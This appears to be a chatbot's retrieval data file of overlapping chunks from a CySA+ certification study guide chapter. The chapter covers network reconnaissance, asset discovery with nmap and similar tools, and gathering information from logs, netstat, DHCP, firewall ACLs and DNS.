uniquely identified, or to be identified as a specific type or version of a device. Device fingerprinting is particularly useful for identifying printers and other networked devices, but can also be used to identify workstations, servers, or
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	operating system versions respond, what TCP options they support, what order they send packets in, and a host of other details can provide a good guess at what OS the remote system is running. Device fingerprinting in this context describes the collection and correlation of information about a device like the software, services, and operating system it runs that allows it to be uniquely identified, or to be identified as a specific type or version of a device. Device fingerprinting is particularly useful for identifying printers and other networked devices, but can also be used to identify workstations, servers, or any other network connected device if enough unique or typical information can be discovered. Devices that are firewalled and that do not respond to probes can still be fingerprinted given access to their network traffic and to network device logs that are available. 168 Chapter 5 ■ Reconnaissance and Intelligence Gathering Determining an Internal Footprint Gathering knowledge about the footprint of an organization from the inside is tremendously valuable. Organizations face both insider threats and very capable malicious actors who build malware and other tools designed to get them past external security layers to less protected internal networks and systems. A security professional must have a good understanding of how their organization’s networks and defenses are laid out and what systems, devices, and services can be found in each part of the network. Security practitioners who perform an internal footprinting exercise typically have the advantage of performing a known-­environment (sometimes called a crystal, or white-­ box) exercise where they have complete access to the knowledge that the organization has about itself. This means that rather than spending time trying to understand network topology, they can spend their time gathering information, scanning networks, and gathering system data. They may still be surprised! Often networks grow organically, and what is shown in an organization’s documentation may not be an exact match for what intelligence gathering shows. The same cautions that apply to using the scanning tools we have discussed in this chapter still hold true for internal testing. Remember to use caution when scanning potentially delicate systems or those that control sensitive processes. Service and Version Identification The ability to identify a service can provide useful information about potential vulnerabilities, as well as verify that the service that is responding on a given port matches the service that typically uses that port. Service identification is usually done in one of two ways: either by connecting and grabbing the banner or connection information provided by the service or by comparing its responses to the signatures of known services. Figure 5.3 shows the same system scanned in Figure 5.1 with the nmap -­sV flag used. The -­sV flag grabs banners and performs other service version validation steps to capture additional information, which it checks against a database of services. The basic nmap output remains the same as Figure 5.1, but we have added information in the Version column, including the service name as well
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Service identification is usually done in one of two ways: either by connecting and grabbing the banner or connection information provided by the service or by comparing its responses to the signatures of known services. Figure 5.3 shows the same system scanned in Figure 5.1 with the nmap -­sV flag used. The -­sV flag grabs banners and performs other service version validation steps to capture additional information, which it checks against a database of services. The basic nmap output remains the same as Figure 5.1, but we have added information in the Version column, including the service name as well as the version and sometimes additional detail about the service protocol version or other details. This information can be used to check for patch levels or vulnerabilities and can also help to identify services that are running on nonstandard ports. Mapping, Enumeration, and Asset Discovery FIGURE 5.3 169 Nmap service and version detection Common Tools The CySA+ Exam Objectives list a number of tools that you’ll need to be familiar with for the exam. These include port scanners, open source intelligence gathering and management tools, and the Metasploit framework which includes many other tools in addition to being the most popular general purpose exploit toolkit for security professionals. nmap Nmap is the most commonly used command-­line port scanner, and it is a free, open source tool. It provides a broad range of capabilities, including multiple scan modes intended to bypass firewalls and other network protection devices. In addition, it provides support for operating system fingerprinting, service identification, and many other capabilities. Using nmap’s basic functionality is quite simple. Port scanning a system merely requires that nmap be installed and that you provide the target system’s hostname or IP address. Figure 5.4 shows an nmap scan of a Windows system with its firewall turned off. The nmap scan provides quite a bit of information about the system—­first, we see a series of common 170 Chapter 5 ■ Reconnaissance and Intelligence Gathering Microsoft ports, including 135, 139, and 445, running Microsoft Remote Procedure Call (MSRPC), NetBIOS, and Microsoft’s domain services, which are useful indicators that a remote system is a Windows host. The additional ports that are shown also reinforce that assessment, since ICSLAP (the local port opened by Internet Connection Sharing) is used for Microsoft internal proxying, Web Services on Devices API (WSDAPI) is a Microsoft devices API, and each of the other ports can be similarly easily identified by using a quick search for the port and service name nmap provides. This means that you can often correctly guess details about a system even without an OS identification scan. FIGURE 5.4 Nmap of a Windows system A more typical nmap scan is likely to include a number of nmap’s command-­line flags: ■■ ■■ ■■ ■■ A scan technique, like TCP SYN, which is the most popular scan method because it uses a TCP SYN packet to verify a service response and is quick and unobtrusive. Other connection methods are Connect,
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the other ports can be similarly easily identified by using a quick search for the port and service name nmap provides. This means that you can often correctly guess details about a system even without an OS identification scan. FIGURE 5.4 Nmap of a Windows system A more typical nmap scan is likely to include a number of nmap’s command-­line flags: ■■ ■■ ■■ ■■ A scan technique, like TCP SYN, which is the most popular scan method because it uses a TCP SYN packet to verify a service response and is quick and unobtrusive. Other connection methods are Connect, which completes a full connection; UDP scans for non-­ TCP services; ACK scans, which are used to map firewall rules; and a variety of other methods for specific uses. A port range, either specifying ports or including the full 1–65535 range. Scanning the full range of ports can be very slow, but it can be useful to identify hidden or unexpected services. Fortunately, nmap’s default ports are likely to help find and identify most systems. Service version detection using the –sV flag, which as shown earlier can provide additional detail but may not be necessary if you intend to use a vulnerability scanner to follow up on your scans. OS detection using the –O flag, which can help provide additional information about systems on your network. Nmap also has an official graphical user interface, Zenmap, which provides additional visualization capabilities, including a topology view mode that provides information about how hosts fit into a network. Mapping, Enumeration, and Asset Discovery 171 Angry IP Scanner Angry IP Scanner is a multiplatform (Windows, Linux, and macOS) port scanner with a graphical user interface. In Figure 5.5, you can see a sample scan run with Angry IP Scanner with the details for a single scanned host displayed. Unlike nmap, Angry IP Scanner does not provide detailed identification for services and operating systems, but you can turn on different modules called fetchers, including ports, TTL, filtered ports, and others. When running Angry IP Scanner, be sure to configure the ports scanned under the Preferences menu; otherwise, no port information will be returned! Unfortunately, Angry IP Scanner requires Java, which means that it may not run on systems where Java is not installed for security reasons. FIGURE 5.5 Angry IP Scanner 172 Chapter 5 ■ Reconnaissance and Intelligence Gathering Angry IP Scanner is not as feature rich as nmap, but the same basic techniques can be used to gather information about hosts based on the port scan results. Figure 5.5 shows the information from a scan of a SOHO network. Note that unlike nmap, Angry IP Scanner does not provide service names or service identification information. Maltego The third network scanning and mapping tool specifically mentioned by the CySA+ exam outline is Maltego. Maltego is an open source tool that focuses on open source intelligence gathering and connecting data points together via a graphical user interface (GUI). Maltego’s GUI provides a way to understand and
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	feature rich as nmap, but the same basic techniques can be used to gather information about hosts based on the port scan results. Figure 5.5 shows the information from a scan of a SOHO network. Note that unlike nmap, Angry IP Scanner does not provide service names or service identification information. Maltego The third network scanning and mapping tool specifically mentioned by the CySA+ exam outline is Maltego. Maltego is an open source tool that focuses on open source intelligence gathering and connecting data points together via a graphical user interface (GUI). Maltego’s GUI provides a way to understand and document correlations and hierarchies. It relies on the concepts of transforms, actions taken by a server that provide additional data or processing about objects and entities. Figure 5.6 shows an example provided as part of the Maltego Community Edition. Additional functionality is available in Enterprise and Pro versions of the software. FIGURE 5.6 Maltego Community Edition Metasploit The Metasploit Framework (MSF), often simply called Metasploit, is a penetration testing framework available in both commercial and open source versions. The open source version shown in Figure 5.7 uses a command-­line interface to allow discovery and exploitation of vulnerabilities. In the example, Metasploit’s ability to gather information about SSH server Mapping, Enumeration, and Asset Discovery 173 versions is demonstrated. First the tool is selected, then the target is set, module options are displayed, and the tool is run. FIGURE 5.7 The Metasploit Framework Metasploit modules include a broad range of functionality, including the ability to scan for ports using tcp, syn, and other scanning modules and to perform web application vulnerability scanning using a module called wmap. Extensive documentation can be found at https://docs.metasploit.com, but sites like www.offensive-­security.com/ metasploit-­unleashed provide excellent tutorials on how to use Metasploit. While the CySA+ exam outline focuses on asset discovery and vulnerability management, Metasploit is even more broadly used as a pentesting tool. Metasploit is one of the most commonly used tools for penetration testers, and practicing with Metasploit can be helpful in order to get a deeper understanding of both offensive and defense security practices. If you’re not familiar with Metasploit, we suggest setting up the Metasploitable virtual machines as well as a Kali Linux VM and following some of the available exploit exercises to get to know the tools and processes better. Recon-­ng Recon-­ng is a module reconnaissance tool. Much like Metasploit, it uses a command-­line interface with search and module selection and installation capabilities that allow you to configure and use it to fit your needs. It is built into Kali Linux, making it easy to access for practice and exploration. It uses a modules marketplace, which is searched using the marketplace search command, and tools like hackertarget can help with open source 174 Chapter 5 ■ Reconnaissance and Intelligence Gathering intelligence (OSINT) gathering to identify targets. Integrations with services like Shodan, an OSINT search engine, can also provide additional open source intelligence, and active search modules like the nmap module can be
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	a command-­line interface with search and module selection and installation capabilities that allow you to configure and use it to fit your needs. It is built into Kali Linux, making it easy to access for practice and exploration. It uses a modules marketplace, which is searched using the marketplace search command, and tools like hackertarget can help with open source 174 Chapter 5 ■ Reconnaissance and Intelligence Gathering intelligence (OSINT) gathering to identify targets. Integrations with services like Shodan, an OSINT search engine, can also provide additional open source intelligence, and active search modules like the nmap module can be used for active information gathering. Figure 5.8 shows an example of information gathering using hackertarget as a domains and hosts identification and search tool. The search returned 500 hostnames and IP addresses, all part of Wiley.com’s domains. FIGURE 5.8 Recon-­ng performing a search of Wiley.com-­related domains In addition to these three scanners, security tools often build in a port scanning capability to support their primary functionality. Metasploit, the Qualys vulnerability management platform, OpenVAS, and Tenable’s Nessus vulnerability scanner are all examples of security tools that have built-­in port scanning capabilities as part of their suite of tools. Packet Capture for Pentesters Many penetration testers will use packet capture tools during their testing to capture additional data. Not only does this provide a potentially useful dataset for further analysis, but it can also be used to identify problems that result during the scan. Of course, port and vulnerability scanning can create a lot of data, so it pays to make sure you need the packet capture data before running a sniffer during scanning. Exam Note The CySA+ exam objectives focus on asset discovery, particularly nmap scans and device fingerprinting. As you consider these topics, think about how they can be applied to discovering, identifying, and inventorying devices and systems on a network. Passive Discovery 175 Passive Discovery Passive discovery is far more challenging than active information gathering. Passive analysis relies on information that is available about the organization, systems, or network without performing your own probes. Passive fingerprinting typically relies on logs and other existing data, which may not provide all the information needed to fully identify targets. Its reliance on stored data means that it may also be out of date! Despite this, you can use a number of common techniques if you need to perform passive fingerprinting. Each relies on access to existing data, or to a place where data can be gathered in the course of normal business operations. Exam Note Be sure to understand the differences between active and passive scanning. This is one of the CySA+ exam objectives. Active scanning interacts with a host, whereas passive information gathering simply observes network activity and draws conclusions. Log and Configuration Analysis Log files can provide a treasure trove of information about systems and networks. If you have access to local system configuration data and logs, you can use the information they contain to build a thorough map of
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	on access to existing data, or to a place where data can be gathered in the course of normal business operations. Exam Note Be sure to understand the differences between active and passive scanning. This is one of the CySA+ exam objectives. Active scanning interacts with a host, whereas passive information gathering simply observes network activity and draws conclusions. Log and Configuration Analysis Log files can provide a treasure trove of information about systems and networks. If you have access to local system configuration data and logs, you can use the information they contain to build a thorough map of how systems work together, which users and systems exist, and how they are configured. Over the next few pages, we will look at how each of these types of log files can be used and some of the common locations where they can be found. Network Devices Network devices log their own activities, status, and events, including traffic patterns and usage. Network device information includes network device logs, network device configuration files, and network flows. Network Device Logs By default, many network devices log messages to their console ports, which means that only a user logged in at the console will see them. Fortunately, most managed networks also send network logs to a central log server using the syslog utility. Many networks also leverage the Simple Network Management Protocol (SNMP) to send device information to a central control system. 176 Chapter 5 ■ Reconnaissance and Intelligence Gathering Network device log files often have a log level associated with them. Although log level definitions vary, many are similar to Cisco’s log levels, which are shown in Table 5.1. TA B L E 5 . 1 Cisco log levels Level Level name Example 0 Emergencies Device shutdown due to failure 1 Alerts Temperature limit exceeded 2 Critical Software failure 3 Errors Interface down message 4 Warning Configuration change 5 Notifications Line protocol up/down 6 Information ACL violation 7 Debugging Debugging messages Network device logs are often not as useful as the device configuration data when you are focused on intelligence gathering, although they can provide some assistance with topology discovery based on the devices they communicate with. During penetration tests or when you are conducting security operations, network device logs can provide useful warning of attacks or reveal configuration or system issues. The Cisco router log shown in Figure 5.9 is accessed using the command show logging and can be filtered using an IP address, a list number, or a number of other variables. Here, we see a series of entries with a single packet denied from a remote host 10.0.2.50. The remote host is attempting to connect to its target system on a steadily increasing TCP port, likely indicating a port scan is in progress and being blocked by a rule in access list 210. FIGURE 5.9 Cisco router log Passive Discovery 177 Network Device Configuration Configuration files from network devices can be invaluable when mapping network topology. Configuration files often
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	using the command show logging and can be filtered using an IP address, a list number, or a number of other variables. Here, we see a series of entries with a single packet denied from a remote host 10.0.2.50. The remote host is attempting to connect to its target system on a steadily increasing TCP port, likely indicating a port scan is in progress and being blocked by a rule in access list 210. FIGURE 5.9 Cisco router log Passive Discovery 177 Network Device Configuration Configuration files from network devices can be invaluable when mapping network topology. Configuration files often include details of the network, routes, systems that the devices interact with, and other network details. In addition, they can provide details about syslog and SNMP servers, administrative and user account information, and other configuration items useful as part of information gathering. Figure 5.10 shows a portion of the SNMP configuration from a typical Cisco router. Reading the entire file shows routing information, interface information, and details that will help you place the router in a network topology. The section shown provides in-­depth detail of the SNMP community strings, the contact for the device, as well as what traps are enabled and where they are sent. In addition, you can see that the organization uses Terminal Access Controller Access Control System (TACACS) to control their servers and what the IP addresses of those servers are. For a security analyst, this is useful information—­for an attacker, this could be the start of an effective social engineering attack! F I G U R E 5 . 10 SNMP configuration from a typical Cisco router Flows Netflow is a Cisco network protocol that collects IP traffic information, allowing network traffic monitoring. Flow data is used to provide a view of traffic flow and volume. A typical flow capture includes the IP and port source and destination for the traffic and the class of service. Netflows and a Netflow analyzer can help identify service problems and baseline typical network behavior and can also be useful in identifying unexpected behaviors. Chapter 5 178 ■ Reconnaissance and Intelligence Gathering Vendors other than Cisco have created their own flow monitoring technology, and although “flows” or “Netflow” is commonly used, they actually use their own names. Juniper’s Jflow and cflowd, Citrix’s AppFlow, and HP’s NetStream, as well as sFlow (an industry term for sampled flow), are all terms you may encounter. Netstat In addition to network log files, local host network information can be gathered using netstat in Windows, Linux, and macOS, as well as most Unix and Unix-­like operating systems. Netstat provides a wealth of information, with its capabilities varying slightly between operating systems. It can provide such information as the following: ■■ Active TCP and UDP connections, filtered by each of the major protocols: TCP, UDP, ICMP, IP, Ipv6, and others. Figure 5.11 shows Linux netstat output for netstat -­ta, showing active TCP connections. Here, an SSH session is open to a remote host. The -­u
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	you may encounter. Netstat In addition to network log files, local host network information can be gathered using netstat in Windows, Linux, and macOS, as well as most Unix and Unix-­like operating systems. Netstat provides a wealth of information, with its capabilities varying slightly between operating systems. It can provide such information as the following: ■■ Active TCP and UDP connections, filtered by each of the major protocols: TCP, UDP, ICMP, IP, Ipv6, and others. Figure 5.11 shows Linux netstat output for netstat -­ta, showing active TCP connections. Here, an SSH session is open to a remote host. The -­u flag would work the same way for UDP; -­w shows RAW, and -­X shows Unix socket connections. F I G U R E 5 . 11 ■■ Linux netstat -­ta output Which executable file created the connection, or its process ID (PID). Figure 5.12 shows a Windows netstat call using the -­o flag to identify process numbers, which can then be referenced using the Windows Task Manager. FIGURE 5.12 Windows netstat -­o output Passive Discovery ■■ Ethernet statistics on how many bytes and packets have been sent and received. In Figure 5.13, netstat is run on a Windows system with the -­e flag, providing interface statistics. This tracks the number of bytes sent and received, as well as errors, discards, and traffic sent via unknown protocols. FIGURE 5.13 ■■ 179 Windows netstat -­e output Route table information, including IPv4 and IPv6 information, as shown in Figure 5.14. This is retrieved using the -­nr flag and includes various information depending on the OS, with the Windows version showing the destination network, netmask, gateway, the interface the route is associated with, and a metric for the route that captures link speed and other details to establish preference for the route. F I G U R E 5 . 14 Windows netstat -­nr output This means that running netstat from a system can provide information about both the machine’s network behavior and what the local network looks like. Knowing what machines a system has or is communicating with can help you understand local topology and services. Best of all, because netstat is available by default on so many operating systems, it makes sense to presume it will exist and that you can use it to gather information. 180 Chapter 5 ■ Reconnaissance and Intelligence Gathering DHCP Logs and DHCP Server Configuration Files The Dynamic Host Configuration Protocol (DHCP) is a client/server protocol that provides an IP address as well as information such as the default gateway and subnet mask for the network segment that the host will reside on. When you are conducting passive reconnaissance, DHCP logs from the DHCP server for a network can provide a quick way to identify many of the hosts on the network. If you combine DHCP logs with other logs, such as firewall logs, you can determine which hosts are provided with dynamic IP addresses and which hosts are using static IP addresses. As you can see
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Dynamic Host Configuration Protocol (DHCP) is a client/server protocol that provides an IP address as well as information such as the default gateway and subnet mask for the network segment that the host will reside on. When you are conducting passive reconnaissance, DHCP logs from the DHCP server for a network can provide a quick way to identify many of the hosts on the network. If you combine DHCP logs with other logs, such as firewall logs, you can determine which hosts are provided with dynamic IP addresses and which hosts are using static IP addresses. As you can see in Figure 5.15, a Linux dhcpd.conf file provides information about hosts and the network they are accessing. F I G U R E 5 . 15 Linux dhcpd.conf file dhcpd.conf and other configuration files can be easily accessed by using the more command to display the file. Most, but not all, configuration files are stored in the /etc directory for Linux systems, although some applications and services keep their configuration files elsewhere—­if you can’t find the configuration file in /etc, check the documentation. In this example, the DHCP server provides IP addresses between 192.168.1.20 and 192.168.1.240; the router for the network is 192.168.1.1, and the DNS servers are 192.168.1.1 and 192.168.1.2. We also see a single system named “Demo” with a fixed DHCP address. Systems with fixed DHCP addresses are often servers or systems that need to have a known IP address for a specific function and are thus more interesting when gathering information. DHCP logs for Linux are typically found in /var/log/dhcpd.log or by using the journalctl command to view logs, depending on the distribution you are using. DHCP logs can provide information about systems, their MAC addresses, and their IP addresses, as seen in this sample log entry: Passive Discovery 181 Oct 5 02:28:11 demo dhcpd[3957]: reuse_lease: lease age 80 (secs) under 25% threshold, reply with unaltered, existing lease Oct 5 02:28:11 demo dhcpd[3957]: DHCPREQUEST for 10.0.2.40 (10.0.2.32) from 08:00:27:fa:25:8e via enp0s3 Oct 5 02:28:11 demo dhcpd[3957]: DHCPACK on 10.0.2.40 to 08:00:27:fa:25:8e v ia enp0s3 Oct 5 02:29:17 demo dhcpd[3957]: reuse_lease: lease age 146 (secs) under 25% threshold, reply with unaltered, existing lease Oct 5 02:29:17 demo dhcpd[3957]: DHCPREQUEST for 10.0.2.40 from 08:00:27:fa: 25:8e via enp0s3 Oct 5 02:29:17 demo dhcpd[3957]: DHCPACK on 10.0.2.40 to 08:00:27:fa:25:8e v ia enp0s3 Oct 5 02:29:38 demo dhcpd[3957]: DHCPREQUEST for 10.0.2.40 from 08:00:27:fa: 25:8e via enp0s3 Oct 5 02:29:38 demo dhcpd[3957]: DHCPACK on 10.0.2.40 to 08:00:27:fa:25:8e (demo) via enp0s3 This log shows a system with IP address 10.0.2.40 renewing its existing lease. The system has a hardware address of 08:00:27:fa:25:8e, and the server runs its DHCP server on the local interface enp0s3. Servers and network devices are often given either static addresses or permanently configured dynamic addresses set in the DHCP server configuration file. Workstations and other nonserver devices are more likely to receive DHCP addresses, making it easier to take a quick guess about what each device’s address may be. Firewall
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	08:00:27:fa: 25:8e via enp0s3 Oct 5 02:29:38 demo dhcpd[3957]: DHCPACK on 10.0.2.40 to 08:00:27:fa:25:8e (demo) via enp0s3 This log shows a system with IP address 10.0.2.40 renewing its existing lease. The system has a hardware address of 08:00:27:fa:25:8e, and the server runs its DHCP server on the local interface enp0s3. Servers and network devices are often given either static addresses or permanently configured dynamic addresses set in the DHCP server configuration file. Workstations and other nonserver devices are more likely to receive DHCP addresses, making it easier to take a quick guess about what each device’s address may be. Firewall Logs and Configuration Files Router and firewall configuration files and logs often contain information about both successful and blocked connections. This means that analyzing router and firewall access control lists (ACLs) and logs can provide useful information about what traffic is allowed and can help with topological mapping by identifying where systems are based on traffic allowed through or blocked. Configuration files make this even easier, since they can be directly read to understand how systems interact with the firewall. Firewall logs can also allow penetration testers to reverse-­engineer firewall rules based on the contents of the logs. Even without the actual configuration files, log files can provide a good view of how traffic flows. Like many other network devices, firewalls often use log levels to separate informational and debugging messages from more important messages. In addition, they typically have a vendor-­specific firewall event log format that provides information based on the vendor’s logging standards. 182 Chapter 5 ■ Reconnaissance and Intelligence Gathering Organizations use a wide variety of firewalls, including those from Cisco, Palo Alto, and Check Point, which means that you may encounter logs in multiple formats. Fortunately, all three have common features. Each provides a date/timestamp and details of the event in a format intended to be understandable. For example, Cisco ASA firewall logs can be accessed from the console using the show logging command (often typed as show log). Entries are reasonably readable, listing the date and time, the system, and the action taken. For example, a log might read: Sep 13 10:05:11 10.0.0.1 %ASA-­ 5-­ 111008: User 'ASAadmin' executed the 'enable' command This command indicates that the user ASAadmin ran the Cisco enable command, which is typically used to enter privileged mode on the device. If ASAadmin was not supposed to use administrative privileges, this would be an immediate red flag in your investigation. Cisco firewall logs use identifiers for messages; in the previous code snippet, you can see the six-­digit number after %ASA-­5-­. This identifier matches the command type, and common security mnemonic identifiers for ASAs include 4000xx, 106xxx, and 710003. Other commands may also be of interest depending on what data you are looking for. You can find a list, as well as tips on finding security incidents via ASA firewall logs, at www.cisco.com/c/en/us/about/security-­center/ identify-­incidents-­via-­syslog.html. A review of router/firewall ACLs can also be conducted manually. A portion of a sample Cisco router ACL
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	would be an immediate red flag in your investigation. Cisco firewall logs use identifiers for messages; in the previous code snippet, you can see the six-­digit number after %ASA-­5-­. This identifier matches the command type, and common security mnemonic identifiers for ASAs include 4000xx, 106xxx, and 710003. Other commands may also be of interest depending on what data you are looking for. You can find a list, as well as tips on finding security incidents via ASA firewall logs, at www.cisco.com/c/en/us/about/security-­center/ identify-­incidents-­via-­syslog.html. A review of router/firewall ACLs can also be conducted manually. A portion of a sample Cisco router ACL is shown here: ip access-­ list extended inb-­ lan permit tcp 10.0.0.0 0.255.255.255 any eq 22 permit tcp 172.16.0.0 0.15.255.255 any eq 22 permit tcp host 192.168.2.1 any eq 22 deny tcp 8.16.0.0 0.15.255.255 any eq 22 This ACL segment names the access list and then sets a series of permitted actions along with the networks that are allowed to perform the actions. This set of rules specifically allows all addresses in the 10.0.0.0 network to use TCP port 22 to send traffic, thus allowing SSH. The 172.16.0.0 network is allowed the same access, as is a host with IP address 192.168.2.1. The final deny rule will prevent the named network range from sending SSH traffic. If you encounter firewall or router configuration files, log files, or rules on the exam, it may help to rewrite them into language you can read more easily. To do that, start with the action or command; then find the targets, users, or other things that are affected. Finally, find any modifiers that specify what will occur or what did occur. In the previous router configuration, you could write permit tcp 10.0.0.0 0.255.255.255 any eq 22 as “Allow TCP traffic from the 10.0.0.0 network on any source port to destination port 22.” Even if Passive Discovery 183 you’re not familiar with the specific configuration or commands, this can help you understand many of the entries you will encounter. System Log Files System logs are collected by most systems to provide troubleshooting and other system information. Log information can vary greatly depending on the operating system, how it is configured, and what service and applications the system is running. Log Types Linux systems typically log to the /var/log directory, although individual applications may have their own logging directory. Windows provides several types of event logs: ■■ ■■ ■■ ■■ ■■ Application logs, containing events logged by programs or applications. What is logged varies from program to program. Security logs, which can capture login events, resource and rights usage, and events like files being opened, created, or deleted. These options are set by administrators of the Windows system. Setup logs are captured when applications are set up. System logs contain events logged by Windows components. These are preset as part of Windows. Forwarded events logs are set up using event subscriptions and contain events collected from remote computers. They have to be specifically configured. Log files
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	■■ ■■ ■■ ■■ ■■ Application logs, containing events logged by programs or applications. What is logged varies from program to program. Security logs, which can capture login events, resource and rights usage, and events like files being opened, created, or deleted. These options are set by administrators of the Windows system. Setup logs are captured when applications are set up. System logs contain events logged by Windows components. These are preset as part of Windows. Forwarded events logs are set up using event subscriptions and contain events collected from remote computers. They have to be specifically configured. Log files can provide information about how systems are configured, what applications are running on them, which user accounts exist on the system, and other details, but they are not typically at the top of the list for reconnaissance. They are gathered if they are accessible, but most log files are kept in a secure location and are not accessible without administrative system access. Exam Note You’ll learn more about log review in Chapter 10, “Incident Detection and Analysis.” Be sure that you have a solid understanding of how to locate and interpret system event logs, firewall logs, web application firewall (WAF) logs, proxy server logs, and intrusion detection and prevention logs before you take the exam. 184 Chapter 5 ■ Reconnaissance and Intelligence Gathering Harvesting Data from DNS and Whois The Domain Name System (DNS) is often one of the first stops when gathering information about an organization. Not only is DNS information publicly available, it is often easily connected to the organization by simply checking for Whois information about their website. With that information available, you can find other websites and hosts to add to your organizational footprint. Whois is a tool used to query domain registration data. We’ll talk about it more later in this chapter. DNS and Traceroute Information DNS converts domain names like google.com to IP addresses (as shown in Figure 5.16) or from IP addresses to human-­understandable domain names. The command for this on Windows, Linux, and macOS systems is nslookup. F I G U R E 5 . 16 Nslookup for google.com Once you know the IP address that a system is using, you can look up information about the IP range it resides in. That can provide information about the company or about the hosting services that they use. Nslookup provides a number of additional flags and capabilities, including choosing the DNS server that you use by specifying it as the second parameter, as shown here with a sample query looking up Microsoft.com via Google’s public DNS server 8.8.8.8: nslookup microsoft.com 8.8.8.8 Other types of DNS records can be looked up using the -­query flag, including MX, NS, SOA, and ANY as possible entries: nslookup -­ query=mx microsoft.com This results in a response like that shown in Figure 5.17. F I G U R E 5 . 17 Nslookup using Google’s DNS with MX query flag Passive Discovery 185 The IP address or hostname
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	additional flags and capabilities, including choosing the DNS server that you use by specifying it as the second parameter, as shown here with a sample query looking up Microsoft.com via Google’s public DNS server 8.8.8.8: nslookup microsoft.com 8.8.8.8 Other types of DNS records can be looked up using the -­query flag, including MX, NS, SOA, and ANY as possible entries: nslookup -­ query=mx microsoft.com This results in a response like that shown in Figure 5.17. F I G U R E 5 . 17 Nslookup using Google’s DNS with MX query flag Passive Discovery 185 The IP address or hostname also can be used to gather information about the network topology for the system or device that has a given IP address. Using traceroute in Linux or macOS (or tracert on Windows systems), you can see the path packets take to the host. Since the Internet is designed to allow traffic to take the best path, you may see several different paths on the way to the system, but you will typically find that the last few responses stay the same. These are often the local routers and other network devices in an organization’s network, and knowing how traffic gets to a system can give you insight into the company’s internal network topology. Some systems don’t respond with hostname data. Traceroute can be helpful, but it often provides only part of the story, as you can see in Figure 5.18, which provides traceroute information to the BBC’s website as shown by the asterisks and request timed out entries in Figure 5.18, and that the last two systems return only IP addresses. F I G U R E 5 . 18 Traceroute for bbc.co.uk This traceroute starts by passing through the author’s home router, then follows a path through Comcast’s network with stops in the South Bend area, and then Chicago. The 4.68.63.125 address without a hostname resolution can be matched to Level 3 communications using a Whois website. The requests that timed out may be due to blocked ICMP responses or other network issues, but the rest of the path remains clear: another Level 3 communications host, then a BBC IP address, and two addresses that are under the control of RIPE, the European NCC. Here we can see details of upstream network providers and backbone networks and even start to get an idea of what might be some of the BBC’s production network IP ranges. The routing information for an organization can provide insight into how their external network connectivity is set up. Fortunately for us, there are public Border Gateway Protocol (BGP) route information servers known as BGP looking glasses. You can find a list of them, including both global and regional servers, at www.bgp4.as/looking-­glasses. 186 Chapter 5 ■ Reconnaissance and Intelligence Gathering Domains and IP Ranges Domain names are managed by domain name registrars. Domain registrars are accredited by generic top-­level domain (gTLD) registries and/or country code top-­level domain (ccTLD) registries. This means that registrars work with
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	the BBC’s production network IP ranges. The routing information for an organization can provide insight into how their external network connectivity is set up. Fortunately for us, there are public Border Gateway Protocol (BGP) route information servers known as BGP looking glasses. You can find a list of them, including both global and regional servers, at www.bgp4.as/looking-­glasses. 186 Chapter 5 ■ Reconnaissance and Intelligence Gathering Domains and IP Ranges Domain names are managed by domain name registrars. Domain registrars are accredited by generic top-­level domain (gTLD) registries and/or country code top-­level domain (ccTLD) registries. This means that registrars work with the domain name registries to provide registration services: the ability to acquire and use domain names. Registrars provide the interface between customers and the domain registries and handle purchase, billing, and day-­to-­day domain maintenance, including renewals for domain registrations. Domain transfer scams often target organizations whose domains are close to expiration. Make sure that the people responsible for domain registration for your organization know which registrar you work with and what to expect for your renewals. Registrars also handle transfers of domains, either due to a sale or when a domain is transferred to another registrar. This requires authorization by the current domain owner, as well as a release of the domain to the new registrar. We Forgot to Renew Our Domain! If an organization doesn’t renew its domain name, someone else can register it. This happens relatively frequently, and there are a number of examples of major companies that forgot to renew their domains. Google, Microsoft, Regions Bank, the Dallas Cowboys, and FourSquare all make the list for domain renewal issues. A story from Google offers a good example of what can happen. In 2015, Google’s domain was not renewed—­in fact, google.com was available via Google Domains, Google’s own domain registry service. Sanmay Ved, a former Google employee, purchased google.com, and immediately received access to the messages that Google’s own domain owners would have normally received. As you might imagine, he could have wreaked havoc if he had decided to abuse the power he suddenly had. Google Domains quickly canceled the sale and refunded Sanmay’s $12. Google later gave Sanmay a “bug bounty” for finding the problem, which Sanmay donated to charity. If you’d like to read Sanmay’s full story, you can find it at www.linkedin.com/ pulse/i-­purchased-­domain-­googlecom-­via-­google-­domains-­sanmay-­ved. The global IP address space is managed by IANA. In addition, IANA manages the DNS Root Zone, which handles the assignments of both gTLDs and ccTLDs. Regional authority over these resources is handled by five regional Internet registries (RIRs): ■■ African Network Information Center (AFRINIC) for Africa Passive Discovery ■■ ■■ ■■ ■■ 187 American Registry for Internet Numbers (ARIN) for the United States, Canada, parts of the Caribbean region, and Antarctica Asia-­Pacific Network Information Centre (APNIC) for Asia, Australia, New Zealand, and other countries in the region Latin America and Caribbean Network Information Centre (LACNIC) for Latin America and parts of the Caribbean not covered by ARIN Réseaux IP Européens Network
